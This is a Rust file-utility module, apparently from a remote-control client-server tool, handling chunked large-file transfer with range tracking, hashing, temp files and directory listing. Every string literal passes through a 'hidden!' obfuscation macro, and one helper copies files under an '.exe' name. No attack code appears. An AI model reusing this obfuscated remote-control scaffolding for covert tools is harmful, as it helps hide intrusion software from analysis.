use std::ffi::OsStr;

use async_recursion::async_recursion;
#[cfg(target_os = "windows")]
use chrono::{DateTime, Utc};
#[cfg(target_os = "windows")]
use chrono_tz::Asia::Shanghai;
use futures::Stream;
use rand::rngs::OsRng;
use rand::RngCore;
use rayon::iter::{ParallelBridge, ParallelIterator};
use sha2::{Digest, Sha256};
use std::collections::BTreeMap;
use std::ops::Range;
use std::path::{Path, PathBuf};
use std::pin::Pin;
use std::time::Duration;
#[cfg(target_os = "windows")]
use std::time::SystemTime;
use tokio::fs::{File, OpenOptions};
use tokio::io::{AsyncReadExt, AsyncSeekExt, AsyncWriteExt, BufReader};
use tokio::{fs, io};

#[cfg(target_os = "windows")]
use crate::generated::encrypted_strings::DATE_TIME_FORMAT;
use crate::hidden;

/// 小文件命令的内存上限；更大的文件必须走分片协议。
pub const MAX_INLINE_FILE_BYTES: usize = 32 * 1024 * 1024;
/// 4 MiB 在吞吐、TLS 写入次数和有界队列内存占用之间较均衡。
pub const FILE_TRANSFER_CHUNK_BYTES: usize = 4 * 1024 * 1024;
/// 与默认数据连接数一致；限制并发可同时利用多链路，又能约束编码缓冲峰值。
pub const FILE_TRANSFER_IN_FLIGHT_PARTS: usize = 3;
pub const MAX_BIG_FILE_BYTES: u64 = 1024 * 1024 * 1024;
pub const MAX_BIG_FILE_PARTS: usize = 4096;
/// 整体传输上限独立于单帧超时，避免慢速对端无限续期占住唯一命令门禁。
pub const FILE_TRANSFER_TIMEOUT: Duration = Duration::from_secs(4 * 60 * 60);
/// 服务端/被控端给传输收尾和错误响应预留 5 分钟，但任何长命令都不能无限等待。
pub const LONG_COMMAND_TIMEOUT: Duration = Duration::from_secs(4 * 60 * 60 + 5 * 60);

pub type FileChunkStream = Pin<Box<dyn Stream<Item = io::Result<(Range<u64>, Vec<u8>)>> + Send>>;

/// 在操作系统临时目录中创建不可预测、不可覆盖的 `.temp` 文件。
///
/// 随机名使用操作系统 CSPRNG 生成 128 bit 熵，`create_new` 保证即使发生极低概率碰撞
/// 或本地攻击者预先占位，也不会跟随或覆盖既有路径。调用方必须在成功提交或失败后删除它。
pub async fn create_random_temp_file() -> anyhow::Result<(PathBuf, File)> {
    const MAX_CREATE_ATTEMPTS: usize = 32;
    let temp_dir = std::env::temp_dir();

    for _ in 0..MAX_CREATE_ATTEMPTS {
        let mut random = [0_u8; 16];
        OsRng.fill_bytes(&mut random);
        let path = temp_dir.join(hidden!(hex::encode(random), ".temp"));

        let mut options = OpenOptions::new();
        options.read(true).write(true).create_new(true);
        #[cfg(unix)]
        {
            options.mode(0o600);
        }

        match options.open(&path).await {
            Ok(file) => return Ok((path, file)),
            Err(error) if error.kind() == io::ErrorKind::AlreadyExists => continue,
            Err(error) => {
                return Err(anyhow::Error::msg(hidden!(
                    "在系统临时目录创建接收文件失败: ",
                    error
                )))
            }
        }
    }

    Err(anyhow::Error::msg(hidden!(
        "无法生成不冲突的随机临时文件名"
    )))
}

/// 发送大文件所需的不可分割准备结果。
///
/// 摘要与后续分片复用同一个已打开文件句柄，避免“取大小、算摘要、再打开流”
/// 三套文件视图造成的竞态和重复打开。线协议要求摘要先于分片发送，因此仍需
/// 两次顺序读取；第二次通常命中系统文件缓存。
pub struct PreparedBigFile {
    pub size: u64,
    pub hash: Vec<u8>,
    pub stream: FileChunkStream,
}

/// 记录乱序到达的文件区间，统一执行越界、重叠和分片数量校验。
pub struct FileRangeTracker {
    total: u64,
    received: u64,
    ranges: BTreeMap<u64, u64>,
}

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub enum FileRangeRegistration {
    New,
    Duplicate,
}

impl FileRangeTracker {
    pub fn new(total: u64) -> anyhow::Result<Self> {
        if total > MAX_BIG_FILE_BYTES {
            return Err(anyhow::Error::msg(hidden!(
                "大文件大小不能超过 ",
                MAX_BIG_FILE_BYTES,
                " 字节"
            )));
        }
        Ok(Self {
            total,
            received: 0,
            ranges: BTreeMap::new(),
        })
    }

    pub fn register(
        &mut self,
        start: u64,
        end: u64,
        data_len: usize,
    ) -> anyhow::Result<FileRangeRegistration> {
        if start > end || end >= self.total {
            return Err(anyhow::Error::msg(hidden!(
                "大文件分片范围越界: ",
                start,
                "..=",
                end
            )));
        }
        let declared_len = end
            .checked_sub(start)
            .and_then(|length| length.checked_add(1))
            .ok_or_else(|| anyhow::Error::msg(hidden!("大文件分片长度溢出")))?;
        if declared_len != data_len as u64 {
            return Err(anyhow::Error::msg(hidden!(
                "大文件分片范围与数据长度不一致"
            )));
        }
        // 连接写结果可能不确定，发送方会在另一条连接重试同一完整帧。
        // 完全相同的地址范围视为幂等重试；最终 SHA-256 仍负责校验内容。
        if self
            .ranges
            .get(&start)
            .is_some_and(|known_end| *known_end == end)
        {
            return Ok(FileRangeRegistration::Duplicate);
        }
        if self.ranges.len() >= MAX_BIG_FILE_PARTS {
            return Err(anyhow::Error::msg(hidden!(
                "大文件分片数量超过 ",
                MAX_BIG_FILE_PARTS
            )));
        }
        if self
            .ranges
            .range(..=start)
            .next_back()
            .is_some_and(|(_, previous_end)| *previous_end >= start)
            || self
                .ranges
                .range(start..)
                .next()
                .is_some_and(|(next_start, _)| *next_start <= end)
        {
            return Err(anyhow::Error::msg(hidden!(
                "大文件分片范围重复或重叠: ",
                start,
                "..=",
                end
            )));
        }
        self.received = self
            .received
            .checked_add(data_len as u64)
            .ok_or_else(|| anyhow::Error::msg(hidden!("大文件接收字节数溢出")))?;
        if self.received > self.total {
            return Err(anyhow::Error::msg(hidden!("大文件接收字节数超过声明大小")));
        }
        self.ranges.insert(start, end);
        Ok(FileRangeRegistration::New)
    }

    pub fn complete(&self) -> bool {
        self.received == self.total
    }
}

#[cfg(target_os = "windows")]
pub async fn ls<P: AsRef<Path>>(
    path: P,
    r: bool,
) -> anyhow::Result<
    Vec<(
        Option<String>,
        bool,
        Option<u64>,
        Option<String>,
        Option<String>,
    )>,
> {
    use std::os::windows::fs::MetadataExt;

    let mut path = path.as_ref().to_path_buf();

    // 如果路径以 ":" 结束（例如 "D:"），则添加反斜杠
    if let Some(os_str) = path.as_os_str().to_str() {
        if os_str.ends_with(':') {
            path.push(hidden!("\\"));
        }
    }
    let mut entries = fs::read_dir(path).await?; //路径不存在在这里返回
    let mut v = vec![];
    while let Some(entry) = entries.next_entry().await? {
        let path = entry.path();
        let metadata = fs::metadata(&path).await?;
        let file_name = match path.file_name() {
            None => None,
            Some(name) => name.to_str().map(ToString::to_string),
        };
        let size = match metadata.is_dir() {
            true => match r {
                true => Some(get_dir_size(path).await?),
                false => None,
            },
            false => Some(metadata.file_size()),
        };

        v.push((
            file_name,
            metadata.is_file(),
            size,
            metadata.created().map(convert_system_time).ok(),
            metadata.modified().map(convert_system_time).ok(),
        ));
    }
    Ok(v)
}

pub fn copy_and_rename<P: AsRef<Path>>(original_path: P) -> anyhow::Result<PathBuf> {
    // 确保输入的路径是一个文件
    let original_path = PathBuf::from(original_path.as_ref());
    if !original_path.is_file() {
        return Err(anyhow::Error::msg(hidden!("Provided path is not a file")));
    }

    let mut new_filename = hidden!("_");
    let file_stem = original_path
        .file_stem()
        .and_then(|value| value.to_str())
        .ok_or_else(|| anyhow::Error::msg(hidden!("文件名不是有效 UTF-8 或缺少文件名")))?;
    new_filename.push_str(file_stem);
    new_filename.push_str(&hidden!(".exe"));

    let new_path = original_path.with_file_name(new_filename);

    std::fs::copy(&original_path, &new_path)?;
    Ok(new_path)
}

/// 有界读取小文件，同时防止元数据检查后的文件增长导致超量分配。
pub async fn read_file_limited<P: AsRef<Path>>(
    path: P,
    max_bytes: usize,
) -> anyhow::Result<Vec<u8>> {
    let file = fs::File::open(path.as_ref()).await?;
    let metadata_len = file.metadata().await?.len();
    if metadata_len > max_bytes as u64 {
        return Err(anyhow::Error::msg(hidden!(
            "文件超过内存传输上限 ",
            max_bytes,
            " 字节，请使用大文件命令"
        )));
    }
    let mut reader = BufReader::new(file).take(max_bytes as u64 + 1);
    let mut buffer = Vec::with_capacity(metadata_len as usize);
    reader.read_to_end(&mut buffer).await?;
    if buffer.len() > max_bytes {
        return Err(anyhow::Error::msg(hidden!(
            "文件读取期间增长并超过内存传输上限 ",
            max_bytes,
            " 字节"
        )));
    }
    Ok(buffer)
}

/// 打开、校验并准备大文件分片流。
pub async fn prepare_big_file<P: AsRef<Path>>(
    path: P,
    chunk_size: usize,
) -> anyhow::Result<PreparedBigFile> {
    if chunk_size == 0 || chunk_size > crate::message::dok::MAX_FILE_PART_BYTES {
        return Err(anyhow::Error::msg(hidden!("大文件分片大小非法")));
    }

    let mut file = File::open(path.as_ref()).await?;
    let size = file.metadata().await?.len();
    if size > MAX_BIG_FILE_BYTES {
        return Err(anyhow::Error::msg(hidden!(
            "大文件大小不能超过 ",
            MAX_BIG_FILE_BYTES,
            " 字节"
        )));
    }

    let (hash, hashed_bytes) = hash_open_file(&mut file).await?;
    if hashed_bytes != size {
        return Err(anyhow::Error::msg(hidden!("文件在摘要计算期间发生变化")));
    }
    file.seek(io::SeekFrom::Start(0)).await?;

    let stream = Box::pin(async_stream::try_stream! {
        let mut offset = 0_u64;
        while offset < size {
            let remaining = size - offset;
            let part_len = remaining.min(chunk_size as u64) as usize;
            let mut data = vec![0_u8; part_len];
            file.read_exact(&mut data).await?;
            let start = offset;
            offset += part_len as u64;
            yield (start..offset, data);
        }
    });

    Ok(PreparedBigFile { size, hash, stream })
}

pub async fn save_file_with_unique_name<P: AsRef<Path>>(
    path: P,
    bys: &[u8],
) -> anyhow::Result<PathBuf> {
    let mut path = path.as_ref().to_path_buf();
    let original_stem = path
        .file_stem()
        .and_then(OsStr::to_str)
        .unwrap_or("")
        .to_owned();
    let extension = path
        .extension()
        .and_then(OsStr::to_str)
        .map(|s| s.to_string());

    let mut counter = 1;
    while path.exists() {
        let mut new_stem = original_stem.clone();
        new_stem.push_str(&hidden!(" (", counter, ")"));
        path.set_file_name(new_stem);
        if let Some(ext) = &extension {
            path.set_extension(ext);
        }
        counter += 1;
    }

    save_file(&path, bys).await.map(|_| path)
}

pub async fn save_file<P: AsRef<Path>>(path: P, bys: &[u8]) -> anyhow::Result<()> {
    // 先确保路径中的目录都存在
    if let Some(parent_dir) = path.as_ref().parent() {
        if !parent_dir.exists() {
            fs::create_dir_all(parent_dir).await?;
        }
    }
    let mut file = OpenOptions::new()
        //文件必须可写
        .write(true)
        //文件不存在时创建
        .create(true)
        //写时将原文件弄成0
        .truncate(true)
        .open(path)
        .await?;

    // 如果你知道预期的大小，可以预先分配空间
    file.set_len(bys.len() as u64).await?;

    file.write_all(bys).await?;

    // 确保数据已经物理地写入磁盘
    file.sync_all().await?;

    Ok(())
}

/// 并行统计目录大小。WalkDir 和 rayon 都是同步阻塞工作，必须放入
/// `spawn_blocking`，不能占住 Tokio 核心工作线程。
pub async fn get_dir_size<P: AsRef<Path>>(path: P) -> io::Result<u64> {
    use walkdir::{DirEntry, WalkDir};
    let path = path.as_ref().to_path_buf();
    fs::metadata(&path).await?;
    tokio::task::spawn_blocking(move || {
        WalkDir::new(path)
            .into_iter()
            .par_bridge()
            .try_fold_with(0u64, |acc, entry| -> io::Result<u64> {
                let entry: DirEntry = entry.map_err(io::Error::other)?;
                let file_type = entry.file_type();
                if file_type.is_file() {
                    Ok(acc + entry.metadata()?.len())
                } else {
                    Ok(acc)
                }
            })
            .try_reduce(|| 0u64, |a, b| Ok(a + b))
    })
    .await
    .map_err(io::Error::other)?
}

// #[async_recursion(?Send)] //这样这个闭包就非Send
#[async_recursion] //这样标记递归闭包就是Send的
                   //多线程递归统计大小,较快
pub async fn get_dir_size_b(path: PathBuf) -> io::Result<u64> {
    if path.is_file() {
        return Ok(path.metadata()?.len());
    }

    let mut total_size = 0u64;
    let mut dir = fs::read_dir(path).await?;
    let mut futures = Vec::new();

    while let Some(entry) = dir.next_entry().await? {
        let path = entry.path();
        let file_type = entry.file_type().await?;

        if file_type.is_dir() {
            futures.push(get_dir_size_b(path));
        } else if file_type.is_file() {
            total_size += entry.metadata().await?.len();
        }
    }
    for f in futures {
        if let Ok(size) = f.await {
            total_size += size;
        }
    }
    Ok(total_size)
}

#[async_recursion] //这个宏貌似比直接写Box pin 性能更好
                   //单线程递归统计大小
pub async fn get_dir_size_t(path: PathBuf) -> io::Result<u64> {
    if path.is_file() {
        return Ok(path.metadata()?.len());
    }

    let mut size = 0;

    let mut dir = fs::read_dir(path).await?;
    while let Some(entry) = dir.next_entry().await? {
        let path = entry.path();

        if path.is_dir() {
            size += get_dir_size_t(path.clone()).await?;
        } else {
            size += path.metadata()?.len();
        }
    }

    Ok(size)
}

#[cfg(target_os = "windows")]
fn convert_system_time(time: SystemTime) -> String {
    let datetime: DateTime<Utc> = time.into();

    // 转换为北京时间
    let datetime_beijing = datetime.with_timezone(&Shanghai);

    // 格式化日期和时间
    datetime_beijing.format(&DATE_TIME_FORMAT()).to_string()
}

async fn hash_open_file(file: &mut File) -> io::Result<(Vec<u8>, u64)> {
    let mut hasher = Sha256::new();
    let mut buffer = vec![0_u8; FILE_TRANSFER_CHUNK_BYTES];
    let mut total = 0_u64;
    loop {
        let read = file.read(&mut buffer).await?;
        if read == 0 {
            break;
        }
        total = total
            .checked_add(read as u64)
            .ok_or_else(|| io::Error::new(io::ErrorKind::InvalidData, hidden!("文件长度溢出")))?;
        hasher.update(&buffer[..read]);
    }
    Ok((hasher.finalize().to_vec(), total))
}

/// 使用可复用的 4 MiB 缓冲计算摘要，避免每个哈希分片单独分配 Vec。
pub async fn compute_hash<P: AsRef<Path>>(path: P) -> anyhow::Result<Vec<u8>> {
    let mut file = File::open(path.as_ref()).await?;
    Ok(hash_open_file(&mut file).await?.0)
}

/// 对已经打开的接收临时文件计算摘要，避免 fsync 后再次按路径打开并引入
/// 路径替换竞态。返回前保留句柄，调用方可在原子替换前显式关闭。
pub async fn compute_open_file_hash(file: &mut File) -> anyhow::Result<Vec<u8>> {
    file.seek(io::SeekFrom::Start(0)).await?;
    Ok(hash_open_file(file).await?.0)
}

/// 在已经打开并预分配的临时文件上写入一个分片。
///
/// 多条数据连接会让分片乱序到达；恰好连续时沿用当前文件游标，否则执行 seek。
/// 调用方负责范围登记，函数本身不 flush。
pub async fn write_range(
    file: &mut File,
    write_cursor: &mut u64,
    start: u64,
    end: u64,
    data: &[u8],
) -> anyhow::Result<()> {
    if start > end
        || end
            .checked_sub(start)
            .and_then(|length| length.checked_add(1))
            != Some(data.len() as u64)
    {
        return Err(anyhow::Error::msg(hidden!("文件分片范围与数据长度不一致")));
    }
    if *write_cursor != start {
        file.seek(io::SeekFrom::Start(start)).await?;
    }
    file.write_all(data).await?;
    *write_cursor = end
        .checked_add(1)
        .ok_or_else(|| anyhow::Error::msg(hidden!("文件写游标溢出")))?;
    Ok(())
}

/// 把系统临时目录中的已校验文件提交到最终路径。
///
/// 同卷时操作系统仍可原子移动；跨卷时 Windows `MOVEFILE_COPY_ALLOWED` 或 Unix
/// copy+fsync+remove 会退化为复制提交。系统临时目录与目标卷可能不同，因此调用方不能
/// 再假设所有提交都具备原子性，但失败前始终保留随机临时文件供清理。
#[cfg(target_os = "windows")]
pub async fn commit_temp_file(source: &Path, destination: &Path) -> anyhow::Result<()> {
    use std::os::windows::ffi::OsStrExt;
    use windows::core::PCWSTR;
    use windows::Win32::Storage::FileSystem::{
        MoveFileExW, MOVEFILE_COPY_ALLOWED, MOVEFILE_REPLACE_EXISTING, MOVEFILE_WRITE_THROUGH,
    };

    let source = source.to_path_buf();
    let destination = destination.to_path_buf();
    tokio::task::spawn_blocking(move || {
        let source_wide = source
            .as_os_str()
            .encode_wide()
            .chain(std::iter::once(0))
            .collect::<Vec<_>>();
        let destination_wide = destination
            .as_os_str()
            .encode_wide()
            .chain(std::iter::once(0))
            .collect::<Vec<_>>();
        unsafe {
            MoveFileExW(
                PCWSTR(source_wide.as_ptr()),
                PCWSTR(destination_wide.as_ptr()),
                MOVEFILE_COPY_ALLOWED | MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH,
            )
        }
        .map_err(|error| anyhow::Error::msg(hidden!("提交目标文件失败: ", error)))
    })
    .await
    .map_err(|error| anyhow::Error::msg(hidden!("文件替换任务失败: ", error)))??;
    Ok(())
}

#[cfg(not(target_os = "windows"))]
pub async fn commit_temp_file(source: &Path, destination: &Path) -> anyhow::Result<()> {
    match fs::rename(source, destination).await {
        Ok(()) => Ok(()),
        Err(error) if error.raw_os_error() == Some(18) => {
            fs::copy(source, destination).await?;
            File::open(destination).await?.sync_all().await?;
            fs::remove_file(source).await?;
            Ok(())
        }
        Err(error) => Err(error.into()),
    }
}

pub async fn create_file(path: impl AsRef<Path>) -> anyhow::Result<File> {
    if let Some(parent_dir) = path.as_ref().parent() {
        if !parent_dir.exists() {
            fs::create_dir_all(parent_dir).await?;
        }
    }
    let file = OpenOptions::new()
        .write(true)
        .append(true)
        .create(true)
        .open(path)
        .await?;
    Ok(file)
}

#[tokio::test]
async fn test() {
    let test_dir = Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("..")
        .join("target")
        .join("common_file_util_test");
    let _ = fs::remove_dir_all(&test_dir).await;
    fs::create_dir_all(&test_dir).await.unwrap();
    let output = save_file_with_unique_name(&test_dir.join("data.bin"), &[0, 1])
        .await
        .unwrap();

    assert!(output.starts_with(&test_dir));
    assert_eq!(fs::read(output).await.unwrap(), [0, 1]);
}

#[tokio::test]
async fn random_temp_file_uses_system_directory_and_temp_extension() {
    let (first_path, first_file) = create_random_temp_file().await.unwrap();
    let (second_path, second_file) = create_random_temp_file().await.unwrap();
    drop((first_file, second_file));

    assert!(first_path.starts_with(std::env::temp_dir()));
    assert_eq!(
        first_path.extension().map(OsStr::as_encoded_bytes),
        Some(&[0x74, 0x65, 0x6d, 0x70][..])
    );
    assert_ne!(first_path, second_path);

    fs::remove_file(first_path).await.unwrap();
    fs::remove_file(second_path).await.unwrap();
}

#[test]
fn file_range_tracker_accepts_out_of_order_and_rejects_overlap() {
    let mut tracker = FileRangeTracker::new(30).unwrap();
    assert_eq!(
        tracker.register(10, 19, 10).unwrap(),
        FileRangeRegistration::New
    );
    assert_eq!(
        tracker.register(10, 19, 10).unwrap(),
        FileRangeRegistration::Duplicate
    );
    assert_eq!(
        tracker.register(0, 9, 10).unwrap(),
        FileRangeRegistration::New
    );
    assert_eq!(
        tracker.register(20, 29, 10).unwrap(),
        FileRangeRegistration::New
    );
    assert!(tracker.complete());
    assert!(tracker.register(5, 14, 10).is_err());
}

#[tokio::test]
async fn out_of_order_and_duplicate_parts_restore_exact_file() {
    let path = Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("..")
        .join("target")
        .join("common_out_of_order_file.bin");
    let _ = fs::remove_file(&path).await;
    let mut file = OpenOptions::new()
        .read(true)
        .write(true)
        .create_new(true)
        .open(&path)
        .await
        .unwrap();
    file.set_len(12).await.unwrap();

    let mut tracker = FileRangeTracker::new(12).unwrap();
    let mut cursor = 0;
    let expected = (0_u8..12).map(|offset| b'a' + offset).collect::<Vec<_>>();
    for (start, data) in [
        (4_u64, &expected[4..8]),
        (0, &expected[0..4]),
        (4, &expected[4..8]),
        (8, &expected[8..12]),
    ] {
        let end = start + data.len() as u64 - 1;
        if tracker.register(start, end, data.len()).unwrap() == FileRangeRegistration::New {
            write_range(&mut file, &mut cursor, start, end, data)
                .await
                .unwrap();
        }
    }
    file.flush().await.unwrap();
    assert!(tracker.complete());
    assert_eq!(fs::read(&path).await.unwrap(), expected);
    drop(file);
    let _ = fs::remove_file(path).await;
}

#[tokio::test]
async fn limited_file_read_rejects_oversized_input() {
    let path = Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("..")
        .join("target")
        .join("common_limited_file_read.bin");
    fs::write(&path, [1_u8, 2, 3, 4]).await.unwrap();
    assert!(read_file_limited(&path, 3).await.is_err());
    assert_eq!(read_file_limited(&path, 4).await.unwrap(), [1, 2, 3, 4]);
    let _ = fs::remove_file(path).await;
}

#[tokio::test]
async fn prepared_big_file_reuses_one_snapshot_contract() {
    use futures::StreamExt;

    let path = Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("..")
        .join("target")
        .join("common_prepared_big_file.bin");
    let expected = (0_u8..=31).collect::<Vec<_>>();
    fs::write(&path, &expected).await.unwrap();

    let prepared = prepare_big_file(&path, 7).await.unwrap();
    assert_eq!(prepared.size, expected.len() as u64);
    assert_eq!(prepared.hash, compute_hash(&path).await.unwrap());

    let mut stream = prepared.stream;
    let mut restored = Vec::new();
    let mut expected_start = 0_u64;
    while let Some(part) = stream.next().await {
        let (range, data) = part.unwrap();
        assert_eq!(range.start, expected_start);
        assert_eq!(range.end - range.start, data.len() as u64);
        expected_start = range.end;
        restored.extend_from_slice(&data);
    }
    assert_eq!(restored, expected);
    let _ = fs::remove_file(path).await;
}

pub async fn get_file_size<P: AsRef<Path>>(path: P) -> Result<u64, std::io::Error> {
    fs::metadata(path.as_ref()).await.map(|meta| meta.len())
}
